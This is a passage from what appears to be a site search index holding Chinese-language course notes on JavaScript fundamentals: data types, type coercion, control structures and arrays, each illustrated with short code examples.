Properties\uff1a\u4f7f\u7528\u70b9 (.) \u8bed\u6cd5\u8bbf\u95ee\uff08\u4f8b\u5982\uff0c<code>\"abc\".length</code>\uff0c<code>Math.sin(...)</code>\uff09\u3002</li> </ul> <ul> <li>Garbage Collection\uff1a\u81ea\u52a8\u7ba1\u7406\u5185\u5b58\u3002\u5f53\u4e0d\u518d\u6709\u5bf9 objects \u7684\u5f15\u7528\u65f6\uff0c\u5b83\u4eec\u4f1a\u88ab\u5783\u573e\u56de\u6536\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#35","title":"3.5 \u6570\u636e\u7c7b\u578b\u8be6\u89e3","text":""},{"location":"cs/mern/3403/w4/#351-numbers","title":"3.5.1 Numbers","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6240\u6709 <code>Number</code> \u503c\u90fd\u8868\u793a\u4e3a\u53cc\u7cbe\u5ea6 64 \u4f4d\u6d6e\u70b9\u6570\uff08IEEE 754 \u6807\u51c6\uff09\u3002\uff08\u6ce8\u610f\uff1a<code>BigInt</code> \u662f\u7528\u4e8e\u4efb\u610f\u5927\u6574\u6570\u7684\u5355\u72ec\u7c7b\u578b\uff09\u3002</p> <ul> <li>Arithmetic Precision\uff1a\u7531\u4e8e\u6d6e\u70b9\u8868\u793a\uff0c\u8fdb\u884c\u7b97\u672f\u8fd0\u7b97\u65f6\u8981\u5c0f\u5fc3\uff0c\u56e0\u4e3a\u53ef\u80fd\u4f1a\u51fa\u73b0\u820d\u5165\u9519\u8bef\u3002</li> <li>Operators\uff1a<ul> <li>\u6807\u51c6\uff1a<code>+</code>\u3001<code>-</code>\u3001<code>*</code>\u3001<code>/</code>\u3001<code>%</code> (modulo)</li> <li>increment/decrement\uff1a<code>++</code>\u3001<code>--</code></li> <li>compound assignment\uff1a<code>+=</code>\u3001<code>-=</code>\u3001<code>*=</code>\u3001<code>/=</code>\u3001<code>%=</code></li> </ul> </li> <li>\u7279\u6b8a\u6570\u5b57\u503c (<code>Number</code> \u5bf9\u8c61\u7684\u5c5e\u6027)\uff1a<ul> <li><code>Number.MAX_VALUE</code>\uff1a\u53ef\u8868\u793a\u7684\u6700\u5927\u6570\u5b57\u3002</li> <li><code>Number.MIN_VALUE</code>\uff1a\u53ef\u8868\u793a\u7684\u6700\u5c0f\u6b63\u6570\u3002</li> <li><code>Number.NaN</code>\uff1a \"Not a Number\" - \u8868\u793a\u65e0\u6548\u7684\u6570\u503c\u7ed3\u679c\u3002</li> <li><code>Number.POSITIVE_INFINITY</code>\u3001<code>Number.NEGATIVE_INFINITY</code>\uff1a\u8868\u793a Infinity\u3002</li> <li>Banana Skin\uff1a\u9664\u4ee5\u96f6\u4f1a\u5bfc\u81f4 <code>Infinity</code>\uff0c\u800c\u4e0d\u662f\u9519\u8bef\u3002</li> <li><code>Number.PI</code>\uff1a\u03c0 \u7684\u503c\u3002\uff08\u6570\u5b66\u5e38\u6570\u66f4\u5e38\u901a\u8fc7 <code>Math</code> \u5bf9\u8c61\u8bbf\u95ee\uff0c\u4f8b\u5982 <code>Math.PI</code>\uff09\u3002</li> </ul> </li> <li>Math \u5bf9\u8c61\uff1a\u63d0\u4f9b\u9ad8\u7ea7\u6570\u5b66\u51fd\u6570\u548c\u5e38\u91cf\uff08\u4f8b\u5982\uff0c<code>Math.sin()</code>\u3001<code>Math.cos()</code>\uff09\u3002</li> <li><code>parseInt()</code>\uff1a\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6574\u6570\u3002\u5982\u679c\u5b57\u7b26\u4e32\u65e0\u6cd5\u8f6c\u6362\u4e3a\u6709\u6548\u7684\u6570\u5b57\uff0c<code>parseInt()</code> \u8fd4\u56de <code>NaN</code>\u3002</li> <li><code>NaN</code> (\"Not a Number\")\uff1a\u56e0\u65e0\u6548\u64cd\u4f5c\u800c\u8fd4\u56de\u3002<ul> <li>Banana Skin\uff1a<code>NaN</code> \u5177\u6709\u201c\u4f20\u67d3\u6027\u201d\uff1a\u4efb\u4f55\u4ee5 <code>NaN</code> \u4f5c\u4e3a\u8f93\u5165\u7684\u6570\u5b66\u8fd0\u7b97\u4e5f\u5c06\u5bfc\u81f4 <code>NaN</code>\u3002</li> </ul> </li> <li><code>isNaN()</code>\uff1a\u7528\u4e8e\u68c0\u67e5\u503c\u662f\u5426\u4e3a <code>NaN</code> \u7684\u5185\u7f6e\u51fd\u6570\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#352-strings","title":"3.5.2 Strings","text":"<p>\u5b57\u7b26\u4e32\u662f Unicode \u5b57\u7b26\u5e8f\u5217\u3002</p> <ul> <li>Literals\uff1a\u7528\u5355\u5f15\u53f7 (<code>'...'</code>) \u6216\u53cc\u5f15\u53f7 (<code>\"...\"</code>) \u754c\u5b9a\u3002</li> <li>Escaping Characters\uff1a\u5728\u5b57\u7b26\u4e32\u4e2d\u4f7f\u7528\u53cd\u659c\u6760 (<code>\\</code>) \u6765\u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\uff1a<code>\\'</code>\u3001<code>\\\"</code>\u3001<code>\\\\</code>\u3001<code>\\n</code>\u3001<code>\\t</code>\u3002</li> <li>Empty String\uff1a<code>\"\"</code> \u6216 <code>''</code>\u3002</li> <li>No Character Data Type\uff1a\u5355\u4e2a\u5b57\u7b26\u8868\u793a\u4e3a\u957f\u5ea6\u4e3a 1 \u7684\u5b57\u7b26\u4e32\u3002</li> <li>Properties and Methods\uff1a<ul> <li><code>length</code>\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32\u4e2d\u5b57\u7b26\u6570\u7684\u5c5e\u6027\u3002</li> <li>\u5e38\u7528\u65b9\u6cd5\u5305\u62ec\uff1a<code>charAt(index)</code>\u3001<code>indexOf(substring)</code>\u3001<code>substring(startIndex, endIndex)</code>\u3001<code>toLowerCase()</code>\u3001<code>toUpperCase()</code>\u3002</li> </ul> </li> <li>String Concatenation\uff1a<code>+</code> operator \u8fde\u63a5\u5b57\u7b26\u4e32\u3002</li> <li>Implicit/Explicit conversion\uff1a\u4e00\u5143\u52a0\u53f7 <code>+</code> \u53ef\u7528\u4e8e\u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6570\u5b57\uff08\u4f8b\u5982\uff0c<code>+ \"123\"</code> \u53d8\u4e3a <code>123</code>\uff09\u3002</li> <li><code>toString()</code> \u65b9\u6cd5\u53ef\u4ee5\u5c06\u6570\u5b57\uff08\u6216\u5176\u4ed6\u7c7b\u578b\uff09\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#353-booleans","title":"3.5.3 Booleans","text":"<p>\u5177\u6709 <code>Boolean</code> \u7c7b\u578b\uff0c\u5b57\u9762\u503c\u4e3a <code>true</code> \u548c <code>false</code>\u3002</p> <ul> <li>Logical Operators\uff1a<ul> <li>Logical NOT\uff1a<code>!</code></li> <li>Logical AND\uff1a<code>&amp;&amp;</code></li> <li>Logical OR\uff1a<code>||</code></li> </ul> </li> <li><code>&amp;&amp;</code> \u548c <code>||</code> \u8fd0\u7b97\u7b26\u4f7f\u7528 short-circuit evaluation\uff1a\u4ec5\u5728\u5fc5\u8981\u65f6\u624d\u5bf9\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u6c42\u503c\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#354-null-undefined","title":"3.5.4 null \u548c undefined","text":"<p>Banana Skin\uff1a\u6709\u4e24\u79cd\u4e0d\u540c\u7684\u503c\u6765\u8868\u793a\u6709\u610f\u4e49\u503c\u7684\u7f3a\u5931\uff0c\u8fd9\u53ef\u80fd\u4ee4\u4eba\u56f0\u60d1\u3002</p> <ul> <li><code>null</code>\uff1a\u8868\u793a\u6709\u610f\u7684\u975e\u503c\u6216\u201c\u7a7a\u201d\u503c\u3002\u5b83\u662f\u4e00\u4e2a\u8d4b\u503c\u3002</li> </ul> <ul> <li> <p>undefined\uff1a\u610f\u5473\u7740\u53d8\u91cf\u5df2\u58f0\u660e\u4f46\u5c1a\u672a\u8d4b\u503c\uff0c\u6216\u8005\u6b63\u5728\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u53d8\u91cf\uff0c\u6216\u8005\u672a\u63d0\u4f9b\u51fd\u6570\u53c2\u6570\u3002</p> <p>\u5728\u5b9e\u8df5\u4e2d\uff0c\u4f60\u901a\u5e38\u4f1a\u6d4b\u8bd5 null\u3002\u610f\u5916\u9047\u5230 undefined \u53ef\u80fd\u8868\u793a\u5b58\u5728\u9519\u8bef\u3002</p> </li> </ul>"},{"location":"cs/mern/3403/w4/#36-dynamic-typing-type-coercion","title":"3.6 Dynamic Typing \u548c Type Coercion","text":""},{"location":"cs/mern/3403/w4/#361-dynamic-typing","title":"3.6.1 Dynamic Typing","text":"<p>\u662f\u52a8\u6001\u7c7b\u578b\u7684\uff0c\u8fd9\u610f\u5473\u7740\u53d8\u91cf\u5728\u58f0\u660e\u65f6\u6ca1\u6709\u56fa\u5b9a\u7684\u5173\u8054\u7c7b\u578b\u3002</p> <p>\u4e00\u4e2a\u53d8\u91cf\u53ef\u4ee5\u5728\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684\u4e0d\u540c\u65f6\u95f4\u4fdd\u5b58\u4e0d\u540c\u7c7b\u578b\u7684\u503c\u3002</p> <pre><code>let value = 5;       // value \u662f\u4e00\u4e2a Number\nvalue = \"Hello\";   // value \u73b0\u5728\u662f\u4e00\u4e2a String\u3002\u6ca1\u6709\u9519\u8bef\u3002\n</code></pre> <ul> <li><code>typeof</code> operator\uff1a\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u6307\u793a\u5176\u64cd\u4f5c\u6570\u7684\u5f53\u524d\u7c7b\u578b\u3002<ul> <li><code>typeof null</code> \u8fd4\u56de <code>\"object\"</code> (\u8fd9\u662f\u4e00\u4e2a\u5386\u53f2\u9057\u7559\u7684\u602a\u7656)\u3002</li> <li><code>typeof function(){}</code> \u8fd4\u56de <code>\"function\"</code>\u3002</li> <li><code>typeof undefinedVariable</code> \u8fd4\u56de <code>\"undefined\"</code>\u3002</li> </ul> </li> </ul>"},{"location":"cs/mern/3403/w4/#362-implicit-type-coercion","title":"3.6.2 Implicit Type Coercion","text":"<p>Banana Skin\uff1a\u5982\u679c\u7c7b\u578b\u4e0d\u540c\uff0c\u7ecf\u5e38\u5c1d\u8bd5\u81ea\u52a8\u5c06\u503c\u4ece\u4e00\u79cd\u7c7b\u578b\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u7c7b\u578b\u4ee5\u6267\u884c\u64cd\u4f5c\u3002\u8fd9\u79f0\u4e3a type coercion\uff0c\u53ef\u80fd\u5bfc\u81f4\u975e\u5e38\u4e0d\u76f4\u89c2\u4e14\u5bb9\u6613\u51fa\u9519\u7684\u884c\u4e3a\u3002</p> <ul> <li> <p>\u671f\u671b <code>Number</code> \u65f6\u7684\u8f6c\u6362\uff1a</p> <ul> <li><code>true</code> \u53d8\u4e3a <code>1</code>\uff0c<code>false</code> \u53d8\u4e3a <code>0</code>\u3002</li> <li>\u5982\u679c\u5b57\u7b26\u4e32\u8868\u793a\u6709\u6548\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a\u6570\u5b57\uff1b\u5426\u5219\uff0c\u5b83\u4eec\u5c06\u53d8\u4e3a <code>NaN</code>\u3002</li> <li>\u6ce8\u610f\uff1a\u7a7a\u5b57\u7b26\u4e32 <code>''</code> \u8f6c\u6362\u4e3a <code>0</code>\uff0c\u800c\u4e0d\u662f <code>NaN</code>\uff01</li> <li><code>null</code> \u8f6c\u6362\u4e3a <code>0</code>\u3002</li> <li><code>undefined</code> \u8f6c\u6362\u4e3a <code>NaN</code>\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u671f\u671b <code>String</code> \u65f6\u7684\u8f6c\u6362\uff1a</p> <ul> <li>\u6570\u5b57\u8f6c\u6362\u4e3a\u5176\u5b57\u7b26\u4e32\u8868\u793a\u5f62\u5f0f\u3002</li> <li>\u5e03\u5c14\u503c\u8f6c\u6362\u4e3a <code>\"true\"</code> \u6216 <code>\"false\"</code>\u3002</li> <li><code>null</code> \u8f6c\u6362\u4e3a <code>\"null\"</code>\u3002</li> <li><code>undefined</code> \u8f6c\u6362\u4e3a <code>\"undefined\"</code>\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u671f\u671b <code>Boolean</code> \u65f6\u7684\u8f6c\u6362 (Truthy/Falsy values)\uff1a</p> <ul> <li>Falsy \u503c (\u8f6c\u6362\u4e3a <code>false</code>)\uff1a<code>0</code>\u3001<code>-0</code>\u3001<code>NaN</code>\u3001<code>\"\"</code> (\u7a7a\u5b57\u7b26\u4e32)\u3001<code>null</code>\u3001<code>undefined</code>\u3002</li> <li>Truthy \u503c (\u6240\u6709\u5176\u4ed6\u503c\u90fd\u8f6c\u6362\u4e3a <code>true</code>)\uff1a\u4efb\u4f55\u975e\u96f6\u6570\u5b57\u3001\u4efb\u4f55\u975e\u7a7a\u5b57\u7b26\u4e32\u3001objects (\u5305\u62ec arrays \u548c functions)\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u5f3a\u5236\u8f6c\u6362\u7684\u6709\u7528\u6848\u4f8b\uff08\u8c28\u614e\u4f7f\u7528\uff09\uff1a</p> <ul> <li> <p>\u5728\u8bbf\u95ee\u5c5e\u6027\u4e4b\u524d\u68c0\u67e5 <code>null</code>/<code>undefined</code> \u5bf9\u8c61\uff1a</p> <pre><code>var property = object &amp;&amp; object.getProperty(); // \u5982\u679c 'object' \u4e3a null/undefined\uff0c\u5219\u5176\u4e3a falsy\uff0c\u53d1\u751f\u77ed\u8def\u3002\n</code></pre> </li> </ul> <ul> <li> <p>\u8bbe\u7f6e\u9ed8\u8ba4\u503c\uff1a</p> <pre><code>let name = otherName || \"default\"; // \u5982\u679c 'otherName' \u4e3a falsy\uff0c\u5219 'name' \u53d8\u4e3a \"default\"\u3002\n</code></pre> </li> </ul> </li> </ul> <ul> <li> <p>Manual Coercion\uff1a\u53ef\u4ee5\u4f7f\u7528 <code>Number()</code>\u3001<code>String()</code> \u548c <code>Boolean()</code> \u51fd\u6570\u663e\u5f0f\u6267\u884c\u8fd9\u4e9b\u8f6c\u6362\uff0c\u8fd9\u901a\u5e38\u66f4\u6e05\u6670\u3002</p> <pre><code>Number(\"42\");    // 42\nString(123);   // \"123\"\nBoolean(\"\");   // false\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#363-comparisons-coercion","title":"3.6.3 Comparisons \u548c Coercion","text":"<p>\u6bd4\u8f83\u8fd0\u7b97\u7b26\uff08<code>&gt;</code>\u3001<code>&lt;</code>\u3001<code>&gt;=</code>\u3001<code>&lt;=</code>\u3001<code>==</code>\u3001<code>!=</code>\u3001<code>===</code>\u3001<code>!==</code>\uff09\u9002\u7528\u4e8e\u6570\u5b57\u548c\u5b57\u7b26\u4e32\u3002</p> <ul> <li>Loose Equality - <code>==</code> \u548c \u4e0d\u7b49 (<code>!=</code>)\uff1a<ul> <li>Banana Skin\uff1a\u5982\u679c\u64cd\u4f5c\u6570\u7c7b\u578b\u4e0d\u540c\uff0c\u8fd9\u4e9b\u8fd0\u7b97\u7b26\u4f1a\u5728\u6bd4\u8f83\u5b83\u4eec\u4e4b\u524d\u6267\u884c\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u3002\u8fd9\u4f1a\u5bfc\u81f4\u8bb8\u591a\u4e0d\u76f4\u89c2\u7684\u7ed3\u679c\u3002</li> <li><code>1 == true</code> \u4e3a <code>true</code>\u3002</li> <li><code>'' == 0</code> \u4e3a <code>true</code>\u3002</li> <li>Non-Transitivity\uff1a\u4f7f\u7528 <code>==</code> \u7684\u76f8\u7b49\u6027\u4e0d\u5177\u6709\u4f20\u9012\u6027\u3002</li> </ul> </li> <li>Strict Equality - <code>===</code> \u548c \u4e0d\u7b49 (<code>!==</code>)\uff1a<ul> <li>Best Practice\uff1a\u4ec5\u5f53\u4e24\u4e2a\u64cd\u4f5c\u6570\u76f8\u7b49 \u4e14 \u7c7b\u578b\u76f8\u540c\u65f6\uff0c\u8fd9\u4e9b\u8fd0\u7b97\u7b26\u624d\u8fd4\u56de <code>true</code>\u3002\u4e0d\u6267\u884c\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u3002</li> <li><code>1 === true</code> \u4e3a <code>false</code>\u3002</li> <li>\u9ed8\u8ba4\u4f7f\u7528 <code>===</code> \u548c <code>!==</code>\u3002</li> </ul> </li> </ul>"},{"location":"cs/mern/3403/w4/#364-type-coercion","title":"3.6.4 Type Coercion \u75af\u72c2\u793a\u4f8b","text":"<p>\u7531\u4e8e\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u800c\u4ea7\u751f\u7684\u4e00\u4e9b\u201c\u75af\u72c2\u201d\u7ed3\u679c\uff1a</p> <ul> <li>\u4f9d\u8d56\u4e8e\u8fd0\u7b97\u7b26\u7684\u5f3a\u5236\u8f6c\u6362\u65b9\u5411\uff1a<ul> <li><code>2 - \"1\"</code> \u7ed3\u679c\u4e3a <code>1</code>\u3002</li> <li><code>2 + \"1\"</code> \u7ed3\u679c\u4e3a <code>\"21\"</code>\u3002</li> </ul> </li> <li>\u610f\u5916\u7684 <code>NaN</code>\uff1a<ul> <li><code>\"b\" + \"a\" + + \"a\" + \"a\"</code> \u7ed3\u679c\u4e3a <code>\"baNaNa\"</code>\u3002</li> </ul> </li> </ul>"},{"location":"cs/mern/3403/w4/#37-control-structures","title":"3.7 Control Structures","text":"<p>\u652f\u6301\u7c7b\u4f3c\u4e8e C/C++/Java \u548c Python \u4e2d\u7684\u6807\u51c6\u63a7\u5236\u6d41\u8bed\u53e5\u3002</p>"},{"location":"cs/mern/3403/w4/#371-loops","title":"3.7.1 Loops","text":"<ul> <li> <p><code>for</code> \u5faa\u73af (C-style)\uff1a</p> <pre><code>let triangle = 0;\nfor (let i = 1; i &lt;= 3; i++) {\n    triangle += i;\n}\n// triangle \u5c06\u4e3a 6\n</code></pre> </li> </ul> <ul> <li> <p><code>for...in</code> \u5faa\u73af\uff1a\u904d\u5386\u5bf9\u8c61\u7684\u5c5e\u6027\uff08\u5305\u62ec\u6570\u7ec4\u7d22\u5f15\u6216\u5bf9\u8c61\u952e\uff09\u3002</p> <pre><code>// \u5bf9\u4e8e\u5bf9\u8c61\uff1a\nconst person = {fname: \"Quentin\", lname: \"Coldwater\", age: 30};\nlet text = \"\";\nfor (let x in person) { // x \u5c06\u662f \"fname\", \"lname\", \"age\"\n    text += person[x] + \" \";\n}\n// text \u53ef\u80fd\u4e3a \"Quentin Coldwater 30 \" (\u5bf9\u8c61\u5c5e\u6027\u7684\u987a\u5e8f\u4e0d\u4fdd\u8bc1)\n\n// \u5bf9\u4e8e\u6570\u7ec4 (\u904d\u5386\u7d22\u5f15)\uff1a\nconst arr = [\"a\", \"b\", \"c\"];\nfor (let index in arr) { // index \u5c06\u662f \"0\", \"1\", \"2\" (\u5b57\u7b26\u4e32!)\n    console.log(arr[index]);\n}\n</code></pre> </li> </ul> <ul> <li> <p><code>while</code> \u5faa\u73af\uff1a</p> <pre><code>let countdown = \"\";\nlet i = 3;\nwhile (i &gt;= 0) {\n    countdown += i + \"!\";\n    i--;\n}\n// countdown \u5c06\u4e3a \"3!2!1!0!\"\n</code></pre> </li> </ul> <ul> <li> <p><code>do...while</code> \u5faa\u73af\uff1a\u5728\u68c0\u67e5\u6761\u4ef6\u4e4b\u524d\u6267\u884c\u5faa\u73af\u4f53\u4e00\u6b21\u3002</p> <pre><code>let result = '';\nlet j = 0;\ndo {\n    j = j + 1;\n    result = result + j;\n} while (j &lt; 5);\n// result \u5c06\u4e3a \"12345\"\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#372-conditional-statements","title":"3.7.2 Conditional Statements","text":"<ul> <li> <p><code>if...else if...else</code> \u8bed\u53e5\uff1a</p> <pre><code>let greeting;\nlet time = new Date().getHours();\nif (time &lt; 10) {\n    greeting = \"Good morning\";\n} else if (time &lt; 20) {\n    greeting = \"Good day\";\n} else {\n    greeting = \"Good evening\";\n}\n</code></pre> <p>\u5373\u4f7f\u5bf9\u4e8e\u5355\u8bed\u53e5\u5757\uff0c\u901a\u5e38\u4e5f\u5efa\u8bae\u4f7f\u7528\u5927\u62ec\u53f7 <code>{}</code>\u3002</p> </li> </ul> <ul> <li> <p><code>switch</code> \u8bed\u53e5\uff1a\u6839\u636e\u8868\u8fbe\u5f0f\u7684\u503c\u63d0\u4f9b\u591a\u8def\u5206\u652f\u3002</p> <pre><code>let text;\nswitch (new Date().getDay()) { // getDay() \u8fd4\u56de 0 \u4ee3\u8868\u661f\u671f\u65e5\uff0c1 \u4ee3\u8868\u661f\u671f\u4e00\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002\n    case 0:\n        text = \"Today is Sunday\";\n        break; // \u91cd\u8981\uff0c\u9632\u6b62 fall-through\n    case 6:\n        text = \"Today is Saturday\";\n        break;\n    default: // \u53ef\u9009\n        text = \"Looking forward to the Weekend!\";\n}\n</code></pre> </li> </ul> <ul> <li> <p>Ternary Operator - <code>condition ? exprIfTrue : exprIfFalse</code>\uff1a\u7f16\u5199 <code>if-else</code> \u8868\u8fbe\u5f0f\u7684\u7b80\u6d01\u65b9\u6cd5\u3002</p> <pre><code>let isMember = true;\nlet price = isMember ? '$2.00' : '$10.00'; // price \u5c06\u4e3a '$2.00'\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#4-arrays","title":"4. Arrays","text":"<p>\u4e2d\u7684\u6570\u7ec4\u662f\u52a8\u6001\u7684\u3001\u6709\u5e8f\u7684\u503c\u96c6\u5408\u3002\u5b83\u4eec\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684 object\u3002</p>"},{"location":"cs/mern/3403/w4/#41-array","title":"4.1 Array \u57fa\u7840","text":"<ul> <li>Definition\uff1a\u7531\u6570\u503c\u7d22\u5f15\u7684\u5143\u7d20\u5217\u8868\u3002</li> </ul> <ul> <li>Indexing\uff1a<code>Array</code> \u7d22\u5f15\u4ece 0 \u5f00\u59cb\u3002</li> </ul> <ul> <li><code>length</code> \u5c5e\u6027\uff1a<code>Array</code> \u7684 <code>length</code> \u6bd4\u6700\u9ad8\u7d22\u5f15\u5927\u4e00\u3002\u5b83\u4f1a\u52a8\u6001\u66f4\u65b0\u3002</li> </ul> <ul> <li>Dynamic Size\uff1a<code>Array</code> \u7684\u5927\u5c0f\u53ef\u4ee5\u5728\u521b\u5efa\u540e\u4fee\u6539\u3002</li> </ul> <ul> <li> <p>Heterogeneous Elements\uff1a</p> <ul> <li>Banana Skin\uff1a<code>Array</code> \u7684\u5143\u7d20\u4e0d\u5fc5\u662f\u540c\u4e00\u7c7b\u578b\u3002</li> </ul> <pre><code>var person = []; // \u521b\u5efa\u4e00\u4e2a\u7a7a\u6570\u7ec4\nperson[0] = \"John\";\nperson[1] = \"Doe\";\nperson[2] = 46; // \u540c\u4e00\u4e2a\u6570\u7ec4\u4e2d\u5305\u542b String\u3001String \u548c Number\n// person.length \u5c06\u4e3a 3\n// person[0] \u5c06\u8fd4\u56de \"John\"\n</code></pre> </li> </ul> <ul> <li> <p>Array \u5b57\u9762\u91cf (Square Bracket Notation)\uff1a\u521b\u5efa arrays \u6700\u5e38\u7528\u7684\u65b9\u6cd5\u3002</p> <pre><code>var fruits = [\"Banana\", \"Orange\", \"Apple\", \"Mango\"];\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#42-array-constructor-method","title":"4.2 Array() Constructor Method","text":"<p>\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>Array()</code> \u6784\u9020\u51fd\u6570\u521b\u5efa arrays\uff0c\u4f46\u5176\u884c\u4e3a\u56e0\u53c2\u6570\u800c\u5f02\uff0c\u8fd9\u53ef\u80fd\u4ee4\u4eba\u56f0\u60d1\uff1a</p> <ul> <li>\u5355\u4e2a\u6570\u5b57\u53c2\u6570\uff1a<code>let a = new Array(10);</code> \u521b\u5efa\u4e00\u4e2a empty array\uff0c\u5176 <code>length</code> \u5c5e\u6027\u8bbe\u7f6e\u4e3a\u6307\u5b9a\u7684\u6570\u5b57\u3002<code>Array</code> \u5143\u7d20\u6700\u521d\u662f undefined\u3002</li> <li>\u65e0\u53c2\u6570\uff1a<code>let b = new Array();</code> \u521b\u5efa\u4e00\u4e2a <code>length</code> \u4e3a 0 \u7684 empty array\u3002</li> <li>\u591a\u4e2a\u53c2\u6570\u6216\u5355\u4e2a\u975e\u6570\u5b57\u53c2\u6570\uff1a<code>let c = Array(10, 2, \"three\", \"four\");</code> \u521b\u5efa\u4e00\u4e2a\u4ee5\u6307\u5b9a\u53c2\u6570\u4f5c\u4e3a\u5176\u5143\u7d20\u7684 array\u3002</li> <li>Banana Skin\uff1a<code>Array(10)</code> \u521b\u5efa\u4e00\u4e2a\u957f\u5ea6\u4e3a 10 \u7684 empty array\uff0c\u4f46 <code>Array(10, 2)</code> \u521b\u5efa\u4e00\u4e2a array <code>[10, 2]</code>\uff0c\u957f\u5ea6\u4e3a 2\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#43-array","title":"4.3 \u8bbf\u95ee\u548c\u4fee\u6539 Array \u5143\u7d20","text":"<ul> <li> <p>Iteration\uff1a</p> <ul> <li> <p>\u4f7f\u7528\u5e26\u6709 <code>length</code> \u5c5e\u6027\u7684\u6807\u51c6 <code>for</code> \u5faa\u73af\uff1a</p> <pre><code>let theBestFruits = [\"Banana\", \"Pomegranate\", \"Mulberry\", \"Pear\"];\nfor (let i = 0; i &lt; theBestFruits.length; i++) {\n    console.log(theBestFruits[i]);\n}\n</code></pre> </li> </ul> <ul> <li> <p>\u4f7f\u7528 <code>for...in</code> \u5faa\u73af\uff08\u5c06\u7d22\u5f15\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fed\u4ee3\uff09\uff1a</p> <pre><code>for (let fruitIndex in theBestFruits) { // fruitIndex \u5c06\u662f \"0\", \"1\", \"2\", \"3\"\n    console.log(theBestFruits[fruitIndex]);\n}\n</code></pre> <p>\uff08\u901a\u5e38\u9996\u9009 <code>for...of</code> (ES6) \u6765\u8fed\u4ee3 array \u503c\uff0c\u6216\u4f20\u7edf\u7684 <code>for</code> \u5faa\u73af\u6216\u50cf <code>forEach</code> \u8fd9\u6837\u7684 array \u65b9\u6cd5\u3002\uff09</p> </li> </ul> </li> </ul> <ul> <li> <p>Dynamic Length Modification\uff1a\u5206\u914d\u7ed9\u5927\u4e8e\u6216\u7b49\u4e8e\u5f53\u524d <code>length</code> \u7684\u7d22\u5f15\u4f1a\u589e\u52a0 array \u7684 <code>length</code>\u3002\u4e2d\u95f4\u7684\u4efb\u4f55\u5143\u7d20\u90fd\u5c06\u53d8\u4e3a undefined\u3002</p> <pre><code>theBestFruits[99] = \"Yuzu\"; // \u5982\u679c theBestFruits \u6709 4 \u4e2a\u5143\u7d20\uff0c\u5176\u957f\u5ea6\u73b0\u5728\u4e3a 100\u3002\n// \u7d22\u5f15 4 \u5230 98 \u7684\u5143\u7d20\u662f undefined\u3002\n</code></pre> </li> </ul> <ul> <li> <p>Accessing Non-existent Indices\uff1a</p> <ul> <li>Banana Skin\uff1a\u67e5\u8be2\u4e0d\u5b58\u5728\u7684 array \u7d22\u5f15\u5c06\u8fd4\u56de undefined\uff0c\u800c\u4e0d\u662f\u9519\u8bef\u3002</li> </ul> <pre><code>console.log(theBestFruits[102]); // \u5982\u679c\u7d22\u5f15 102 \u4e0d\u5b58\u5728\uff0c\u5219\u8fd4\u56de undefined\n</code></pre> </li> </ul>"},{"location":"cs/mern/3403/w4/#44-array-methods","title":"4.4 Array \u65b9\u6cd5 (Methods)","text":"<p>Arrays \u5e26\u6709\u8bb8\u591a\u7528\u4e8e\u64cd\u4f5c\u7684\u5185\u7f6e\u65b9\u6cd5\u3002\u4e00\u4e9b\u5e38\u89c1\u7684\u65b9\u6cd5\u5305\u62ec\uff1a</p> <ul> <li><code>push(element1, ..., elementN)</code>\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u6dfb\u52a0\u5230 array \u7684\u672b\u5c3e\uff0c\u5e76\u8fd4\u56de\u65b0\u7684\u957f\u5ea6\u3002</li> <li><code>pop()</code>\uff1a\u4ece array \u4e2d\u5220\u9664\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002</li> <li><code>shift()</code>\uff1a\u4ece array \u4e2d\u5220\u9664\u7b2c\u4e00\u4e2a\u5143\u7d20\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u3002</li> <li><code>unshift(element1, ..., elementN)</code>\uff1a\u5c06\u4e00\u4e2a\u6216\u591a\u4e2a\u5143\u7d20\u6dfb\u52a0\u5230 array \u7684\u5f00\u5934\uff0c\u5e76\u8fd4\u56de\u65b0\u7684\u957f\u5ea6\u3002</li> <li><code>join(separator)</code>\uff1a\u5c06 array \u7684\u6240\u6709\u5143\u7d20\u8fde\u63a5\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002</li> <li><code>reverse()</code>\uff1a\u5c31\u5730\u53cd\u8f6c array \u7684\u5143\u7d20\u3002</li> <li><code>sort(compareFunction)</code>\uff1a\u5c31\u5730\u5bf9 array \u7684\u5143\u7d20\u8fdb\u884c\u6392\u5e8f\u3002\u63a5\u53d7\u4e00\u4e2a\u53ef\u9009\u7684\u6bd4\u8f83\u5668\u51fd\u6570\u3002</li> <li><code>concat(array2, ..., 